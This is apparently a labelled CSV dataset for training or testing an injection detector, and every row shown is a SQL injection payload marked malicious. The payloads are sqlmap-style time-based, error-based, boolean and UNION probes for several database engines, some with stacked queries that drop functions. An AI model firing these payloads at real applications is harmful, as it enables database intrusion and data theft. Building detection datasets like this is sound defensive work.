payload,label,attack_type
"1');select benchmark(5000000,md5(0x4c4d6142)) and ('dvpw'='dvpw",malicious,sqli
"1' where 9241=9241 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
-8047' or 3038=3038,malicious,sqli
"1 where 2278=2278 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
-6473' union all select 7537#,malicious,sqli
"1) where 7881=7881 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1' and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and 'hstg' like 'hstg",malicious,sqli
"1%""));(select * from (select(sleep(5)))acdk)#",malicious,sqli
"-1083') union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",malicious,sqli
1'+(select bgbq where 1589=1589 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+',malicious,sqli
"1' in boolean mode) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1'+(select 'yahq' where 6974=6974 union all select null--,malicious,sqli
"1"")));begin user_lock.sleep(5); end and (((""memh"" like ""memh",malicious,sqli
"1)) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((4090=4090",malicious,sqli
1)) as jvoo where 5116=5116 or 4240=(select 4240 from pg_sleep(5))--,malicious,sqli
"1"") and 3732=3850 and (""edjv""=""edjv",malicious,sqli
"-8875"") where 8428=8428 or 1519=5756--",malicious,sqli
"-8144') where 1691=1691 or elt(7246=7816,7816)--",malicious,sqli
"1%"";select (case when (1776=7688) then 1776 else 1/(select 0) end)--",malicious,sqli
"-3377"") or 4982=6608#",malicious,sqli
"-4694%""))) union all select 9178,9178,9178,9178,9178--",malicious,sqli
-2207%') or (8459=8459)*4906 and ('%'=',malicious,sqli
"1%"")) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""mubt""=""mubt",malicious,sqli
1' in boolean mode) rlike (select (case when (1343=1595) then 1 else 0x28 end))#,malicious,sqli
"1));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
-9660)) or 9762=9698,malicious,sqli
"1')) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1"" where 2131=2131 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",malicious,sqli
1' where 4403=4403 rlike sleep(5)#,malicious,sqli
"1) or 8421=(select count(*) from generate_series(1,5000000))",malicious,sqli
"1""))) rlike (select * from (select(sleep(5)))sgvo) and (((""tpxo"" like ""tpxo",malicious,sqli
"-9150%'))) union all select 7057,7057,7057,7057,7057,7057,7057,7057--",malicious,sqli
"1%';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
"-2325'))) union all select 1442,1442,1442--",malicious,sqli
"1') where 4297=4297 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1%""));begin user_lock.sleep(5); end and ((""%""=""",malicious,sqli
"1')) union all select null,null,null,null#",malicious,sqli
"-6370')) as sims where 9388=9388 union all select 9388,9388,9388,9388,9388,9388,9388,9388#",malicious,sqli
"-4527' union all select 7115,7115#",malicious,sqli
"1"")));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",malicious,sqli
"-4915' union all select 1928,1928,1928,1928#",malicious,sqli
"1"") as yzny where 4869=4869 rlike (select * from (select(sleep(5)))sgvo)--",malicious,sqli
"1',(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",malicious,sqli
-1866')) as cwtv where 3295=3295 order by 1--,malicious,sqli
"-6496"") as obnf where 2903=2903 or make_set(9354=9354,7185)--",malicious,sqli
"1%"");select (case when (1898=4705) then 1898 else 1/(select 0) end)--",malicious,sqli
"-2028%'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('%'='",malicious,sqli
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",malicious,sqli
1' in boolean mode) or (select * from (select(sleep(5)))sddo)#,malicious,sqli
"1' in boolean mode);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1'+(select 'uqaf' where 7414=7414;iif(5257=5257,1,1/0)",malicious,sqli
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- jdia,malicious,sqli
"1%"")) union all select null#",malicious,sqli
"1)) union all select null,null,null--",malicious,sqli
"1%"") order by 1--",malicious,sqli
"1) as mwcs where 2544=2544 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",malicious,sqli
"1"")) and make_set(1167=5027,5027) and ((""grfi""=""grfi",malicious,sqli
"1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",malicious,sqli
"-9587 union all select 1568,1568,1568,1568,1568,1568#",malicious,sqli
"-2734') union all select 5510,5510,5510,5510,5510#",malicious,sqli
1%' and 8594=(select 8594 from pg_sleep(5))--,malicious,sqli
"1"");select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1"" rlike sleep(5)",malicious,sqli
"1%') union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
1%')));begin dbms_lock.sleep(5); end and ((('%'=',malicious,sqli
"1'+(select 'mgrj' where 8514=8514 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x))+'",malicious,sqli
"1') where 6214=6214 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",malicious,sqli
1')) and (7517=3423)*3423 and (('aenz'='aenz,malicious,sqli
"-8034"") where 1292=1292 union all select 1292,1292,1292,1292,1292#",malicious,sqli
"1'))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((('nsji'='nsji",malicious,sqli
1'))) and 1743=6793 and ((('rgcv'='rgcv,malicious,sqli
1' and (1088=7530)*7530 and 'xkfu'='xkfu,malicious,sqli
"1) where 4810=4810 union all select null,null#",malicious,sqli
"1%"" or 8421=(select count(*) from generate_series(1,5000000)) and ""%""=""",malicious,sqli
"1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",malicious,sqli
"-5130')) union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",malicious,sqli
"-6870"") as deox where 8198=8198 union all select 8198#",malicious,sqli
-8639) or 8138=6252,malicious,sqli
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('jxqf' like 'jxqf",malicious,sqli
"1' where 2661=2661;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
"-7295"") or 9323=9323#",malicious,sqli
"1') as fyuh where 7608=7608 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",malicious,sqli
1'+(select 'dhcv' where 9372=9372;begin dbms_lock.sleep(5); end)+',malicious,sqli
"1"")));select * from generate_series(9058,9058,case when (9058=1183) then 1 else 0 end) limit 1--",malicious,sqli
"1';select benchmark(5000000,md5(0x4c4d6142))",malicious,sqli
"1%') and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('%'='",malicious,sqli
1';select sleep(5) and 'eskp' like 'eskp,malicious,sqli
"1""));select sleep(5) and ((""vzye""=""vzye",malicious,sqli
1' order by 1--,malicious,sqli
"-9405') union all select 8283,8283,8283,8283--",malicious,sqli
"1') where 9951=9951 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--",malicious,sqli
1 order by 1#,malicious,sqli
1');begin dbms_lock.sleep(5); end and ('hmtt' like 'hmtt,malicious,sqli
"-3347%"" or 9323=9323#",malicious,sqli
1') as ubvf where 5923=5923 and 8490=4925--,malicious,sqli
"1%"") waitfor delay '0:0:5' and (""%""=""",malicious,sqli
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",malicious,sqli
"1"")) or 6793=(select 6793 from pg_sleep(5)) and ((""umfr"" like ""umfr",malicious,sqli
"iif(3204=8489,3204,1/0)",malicious,sqli
"-5292') union all select 1439,1439,1439,1439#",malicious,sqli
"-1407 where 1186=1186 union all select 1186,1186,1186,1186,1186--",malicious,sqli
"1' or elt(6272=6272,sleep(5)) and 'fvtf' like 'fvtf",malicious,sqli
-6244') as szpd where 8445=8445 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,malicious,sqli
"-3109"" or elt(1032=1032,3623)",malicious,sqli
1' order by 1#,malicious,sqli
1)) as wwkw where 7289=7289 and 7533=7533--,malicious,sqli
-4498) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (2902=2902,malicious,sqli
"1'))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('trdf' like 'trdf",malicious,sqli
"1"" where 7371=7371 waitfor delay '0:0:5'--",malicious,sqli
"1"" where 9014=9014 and 6969=(select 6969 from pg_sleep(5))--",malicious,sqli
-9178') or 9779=6351,malicious,sqli
"1"") as htyo where 8322=8322 and 4595=4595#",malicious,sqli
"1"") as mwja where 7881=7881 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",malicious,sqli
"-5024%"" or make_set(3321=7355,7355) and ""%""=""",malicious,sqli
-3634%')) or 2671=2434,malicious,sqli
1'))) union all select null#,malicious,sqli
1) and (select * from (select(sleep(5)))fzno),malicious,sqli
"1 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",malicious,sqli
"-7448 union all select 4072,4072#",malicious,sqli
"1""))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
1')) rlike (select * from (select(sleep(5)))sgvo) and (('pemj'='pemj,malicious,sqli
1%')));if(9770=9748) select 9770 else drop function zyuo--,malicious,sqli
"1')) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
1') where 4364=4364 and 8594=(select 8594 from pg_sleep(5))--,malicious,sqli
"1"" and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""arqb"" like ""arqb",malicious,sqli
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('jicq' like 'jicq",malicious,sqli
"-9854) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (5696=5696",malicious,sqli
1%')));begin dbms_lock.sleep(5); end--,malicious,sqli
-7726 or 3038=3038,malicious,sqli
"1 and elt(4249=4249,7259)",malicious,sqli
"1) where 8008=8008 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1,(select (case when (7616=7616) then 1 else 1/(select 0) end))",malicious,sqli
"1"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""bvdv"" like ""bvdv",malicious,sqli
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",malicious,sqli
1' where 1692=1692;begin dbms_lock.sleep(5); end--,malicious,sqli
"1'||(select 'asfl' from dual where 5846=5846 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",malicious,sqli
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('wdeu' like 'wdeu",malicious,sqli
"-8153' where 2436=2436 union all select 2436,2436,2436,2436,2436,2436,2436,2436,2436,2436#",malicious,sqli
"1 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)# usus",malicious,sqli
"1"" union all select null,null,null,null,null,null,null,null#",malicious,sqli
"1%'));iif(5519=4796,1,1/0)",malicious,sqli
-1648)) as oqqy where 3459=3459 or 6872=6872--,malicious,sqli
"1'))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('wsmq'='wsmq",malicious,sqli
"1"")) as upvg where 4826=4826;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1""))) union all select null,null,null,null--",malicious,sqli
"1"";begin user_lock.sleep(5); end and ""unqj""=""unqj",malicious,sqli
"-6253' union all select 5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",malicious,sqli
-8233' or 9538=1882#,malicious,sqli
"1') or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1'+(select 'ndpx' where 4061=4061 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1"")) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ((""umst""=""umst",malicious,sqli
"1) as svkf where 6503=6503 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"-9240' union all select 6538,6538,6538#",malicious,sqli
"1))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((6312=6312",malicious,sqli
"-6360') as yfrk where 3683=3683 union all select 3683,3683,3683,3683,3683,3683,3683,3683,3683#",malicious,sqli
"-1922%') union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",malicious,sqli
"1,(select (case when (8392=8404) then 1 else 8392*(select 8392 from information_schema.character_sets) end))",malicious,sqli
1') and (3020=3020)*6703 and ('botl' like 'botl,malicious,sqli
1%')) and 3721=2597#,malicious,sqli
1') and 2564=3234--,malicious,sqli
"1' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and 'ytlf'='ytlf",malicious,sqli
"1%' or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and '%'='",malicious,sqli
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('sied'='sied",malicious,sqli
"1%""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""%""=""",malicious,sqli
"1) where 8164=8164 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1"")) and sleep(5) and ((""lied"" like ""lied",malicious,sqli
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pnpx'='pnpx,malicious,sqli
1')) as qswu where 6377=6377;select case when 5433=6458 then 1 else null end--,malicious,sqli
"-8069)) as sxbn where 7689=7689 union all select 7689,7689,7689,7689,7689,7689,7689,7689,7689,7689--",malicious,sqli
"1'+(select snam where 1993=1993;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",malicious,sqli
"elt(2567=9921,9921)",malicious,sqli
"1'||(select 'jlon' where 1461=1461;iif(5257=5257,1,1/0)",malicious,sqli
1') as wquy where 2518=2518;select sleep(5)#,malicious,sqli
"-1432"")) union all select 9008,9008,9008#",malicious,sqli
1') or (select * from (select(sleep(5)))ydpu) and ('brob'='brob,malicious,sqli
-1854') as fmmq where 7326=7326 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,malicious,sqli
1) as bidc where 5268=5268 and (select * from (select(sleep(5)))fzno)--,malicious,sqli
-8701%')) or (4843=1690)*1690 and (('%'=',malicious,sqli
"-1503"" order by 1--",malicious,sqli
"1"")) as uqkn where 4642=4642 or elt(6272=6272,sleep(5))--",malicious,sqli
-8836%') or 4856=3891,malicious,sqli
"1%"" union all select null,null,null,null,null,null,null#",malicious,sqli
"-1512 union all select 9013,9013,9013,9013#",malicious,sqli
1';if(4947=5350) select 4947 else drop function ereg--,malicious,sqli
-1011 or 7140=9977--,malicious,sqli
"1 where 2292=2292 union all select null,null,null,null#",malicious,sqli
-8187'))) or 1698=2823#,malicious,sqli
"1%""))) and 4595=4595#",malicious,sqli
"1'||(select 'hfbt' where 7204=7204 union all select null,null,null,null,null,null,null,null,null,null--",malicious,sqli
"1'+(select rwse where 9843=9843 union all select null,null,null,null,null,null,null--",malicious,sqli
"-8677'||(select 'ihpm' from dual where 9571=9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",malicious,sqli
"1""))) union all select null,null,null,null,null,null,null,null,null--",malicious,sqli
"1"" and (7424=2381)*2381 and ""dvju""=""dvju",malicious,sqli
"1"";select sleep(5) and ""irxg""=""irxg",malicious,sqli
"1'))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('msjw' like 'msjw",malicious,sqli
"1"") as yphz where 8174=8174 union all select null,null,null,null,null,null,null--",malicious,sqli
"1%"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""%""=""",malicious,sqli
1') and (2763=4004)*4004 and ('dtts'='dtts,malicious,sqli
-2707'))) or (8459=8459)*4906 and ((('mwdq'='mwdq,malicious,sqli
1'+(select 'vidl' where 9445=9445 and 5498=5777#,malicious,sqli
1')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,malicious,sqli
"1""));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",malicious,sqli
"1,(select (case when (5154=5154) then 1 else 5154*(select 5154 from master..sysdatabases) end))",malicious,sqli
"-3609"")) as fzyp where 9474=9474 or 9323=9323#",malicious,sqli
-6412%' or 4065=5815 and '%'=',malicious,sqli
"-5355"" or make_set(9354=9354,7185)",malicious,sqli
"1'+(select 'mdiu' where 4443=4443;select benchmark(5000000,md5(0x4c4d6142)))+'",malicious,sqli
"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",malicious,sqli
"1"") as fcrx where 2929=2929 and 2820=5133",malicious,sqli
"1"")) as tgwp where 9405=9405;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
1')) and 7533=7533 and (('ialm'='ialm,malicious,sqli
"1)) as vmwj where 5597=5597;iif(5257=5257,1,1/0)",malicious,sqli
"1%"");select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and (""%""=""",malicious,sqli
"1 where 1776=1776 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1%""))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (((""%""=""",malicious,sqli
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",malicious,sqli
1) as ryks where 1196=1196;select (case when (1005=5996) then 1 else 1005*(select 1005 from master..sysdatabases) end)--,malicious,sqli
"1"")) as lomw where 9257=9257 union all select null,null,null,null,null,null--",malicious,sqli
"1' where 8864=8864;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
"1') where 7391=7391 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",malicious,sqli
"-3805""))) union all select 9123,9123,9123,9123,9123,9123,9123,9123#",malicious,sqli
"1' in boolean mode) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
-4055')) as yoez where 3816=3816 or (8459=8459)*4906--,malicious,sqli
"1'||(select 'ysij' from dual where 6140=6140 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))||'",malicious,sqli
"1'+(select 'qmtx' where 6992=6992 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1);begin dbms_lock.sleep(5); end,malicious,sqli
"1 where 3410=3410 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"-4596"" union all select 5761#",malicious,sqli
"1%""));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",malicious,sqli
"1"")) as jgie where 8017=8017 and (select * from (select(sleep(5)))fzno)--",malicious,sqli
"1')) as yyja where 4321=4321 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1'+(select 'arzm' where 6464=6464 or 8466=benchmark(5000000,md5(0x694a4745)))+'",malicious,sqli
"-3081""))) or 3736=1899",malicious,sqli
"1')) as umah where 3781=3781 union all select null,null,null,null#",malicious,sqli
1' and (3020=3020)*6703,malicious,sqli
-4082)) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((7874=7874,malicious,sqli
"1) where 4573=4573;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
"1' in boolean mode) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",malicious,sqli
"1%' or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",malicious,sqli
"-8301') union all select 1806,1806--",malicious,sqli
"1') or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('tvcm'='tvcm",malicious,sqli
-8729'+(select 'nbzl' where 7160=7160 order by 1#,malicious,sqli
-4713'))) or 4567=1287,malicious,sqli
"1'+(select 'stdl' where 4581=4581;iif(7953=3021,1,1/0)",malicious,sqli
-5217 where 3620=3620 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,malicious,sqli
-7772')) or 9323=9323#,malicious,sqli
"1"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""znzb"" like ""znzb",malicious,sqli
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))# lchh",malicious,sqli
"-8294%' union all select 8728,8728,8728,8728,8728,8728,8728,8728,8728,8728#",malicious,sqli
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""uhvy""=""uhvy",malicious,sqli
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)",malicious,sqli
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# utdm",malicious,sqli
-2992%'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('%'=',malicious,sqli
"1) where 1443=1443 union all select null,null,null,null,null#",malicious,sqli
-1662 where 1119=1119 or (8459=8459)*4906--,malicious,sqli
"1"" where 6501=6501;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",malicious,sqli
"1%' union all select null,null,null,null,null,null--",malicious,sqli
"1%')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('%'='",malicious,sqli
"1"")) as knyf where 8109=8109 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1"")));select count(*) from generate_series(1,5000000)--",malicious,sqli
1' and 7533=7533 and 'jwgc'='jwgc,malicious,sqli
"1"");waitfor delay '0:0:5'--",malicious,sqli
"-7333%""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",malicious,sqli
"1"") as ztkr where 1532=1532;select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,sqli
"1' where 1895=1895 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1""))) union all select null,null,null,null,null,null,null,null#",malicious,sqli
"1"")) rlike (select * from (select(sleep(5)))vwyq)#",malicious,sqli
"1) as ndgd where 2367=2367 or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1"" where 1831=1831 and (select * from (select(sleep(5)))gcrr)#",malicious,sqli
"1"")) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""opgb"" like ""opgb",malicious,sqli
-6984 order by 1#,malicious,sqli
"1')) union all select null,null,null#",malicious,sqli
"1') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('xhez' like 'xhez",malicious,sqli
"1"") where 9020=9020 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)--",malicious,sqli
"1 and elt(1210=1210,sleep(5))# macc",malicious,sqli
